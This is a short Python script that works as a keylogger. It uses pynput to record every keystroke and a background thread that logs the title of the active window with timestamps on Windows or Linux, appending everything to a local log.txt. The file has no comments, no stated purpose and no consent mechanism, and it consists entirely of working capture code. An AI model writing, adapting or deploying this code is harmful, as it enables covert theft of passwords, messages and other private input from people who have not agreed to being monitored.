from pynput import keyboard
import time
import threading
import platform

# Conditional imports
if platform.system() == "Windows":
    import win32gui
elif platform.system() == "Linux":
    import subprocess

def get_active_window():
    try:
        if platform.system() == "Windows":
            window = win32gui.GetForegroundWindow()
            title = win32gui.GetWindowText(window)
            return title
        elif platform.system() == "Linux":
            window = subprocess.check_output(['xdotool', 'getwindowfocus', 'getwindowname'])
            return window.decode('utf-8').strip()
        else:
            return "Unsupported OS"
    except:
        return "Unknown Window"

current_window = ""

def track_window_changes():
    global current_window
    while True:
        new_window = get_active_window()
        if new_window != current_window:
            current_window = new_window
            with open("log.txt", "a", encoding="utf-8") as f:
                f.write(f"\n\n[{current_window}] — {time.ctime()}\n")
        time.sleep(1)

def on_press(key):
    try:
        log = f"{key.char}"
    except AttributeError:
        log = f"[{key.name}]"
    with open("log.txt", "a", encoding="utf-8") as f:
        f.write(log)

window_thread = threading.Thread(target=track_window_changes)
window_thread.daemon = True
window_thread.start()

listener = keyboard.Listener(on_press=on_press)
listener.start()

listener.join()






























